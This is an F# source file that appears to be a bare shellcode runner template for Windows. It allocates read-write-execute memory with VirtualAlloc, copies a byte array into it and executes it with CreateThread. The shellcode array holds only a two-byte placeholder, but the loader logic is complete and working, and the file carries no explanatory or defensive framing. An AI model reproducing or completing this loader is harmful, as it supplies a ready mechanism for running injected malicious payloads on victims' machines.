open System
open System.Runtime.InteropServices


let MEM_COMMIT:UInt32 = uint32 0x1000
let PAGE_EXECUTE_READWRITE:UInt32 = uint32 0x40
let INFINITE:UInt32 = uint32 0xffffffff

[<DllImport("kernel32", CallingConvention = CallingConvention.Cdecl)>]
extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);

[<DllImport("kernel32", CallingConvention = CallingConvention.Cdecl)>]
extern uint32 WaitForSingleObject(IntPtr hHandle, uint32 dwMilliseconds)

[<DllImport("kernel32", CallingConvention = CallingConvention.Cdecl)>]
extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint32 dwCreationFlags, uint32& lpThreadId)

[<EntryPoint>]
let main argv =
    let mutable shellcode:byte[] = [|byte 0x00; byte 0x00|]
    let zero:uint32 = uint32 0
    let mutable lpThreadId:uint32 = uint32 0
    let mutable mem = VirtualAlloc(IntPtr.Zero, UIntPtr(uint32 shellcode.Length), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    Marshal.Copy(shellcode, 0, mem, shellcode.Length)
    let mutable thread = CreateThread(IntPtr.Zero, zero, mem, IntPtr.Zero, zero, &lpThreadId)
    WaitForSingleObject(thread, INFINITE) |> ignore
    0
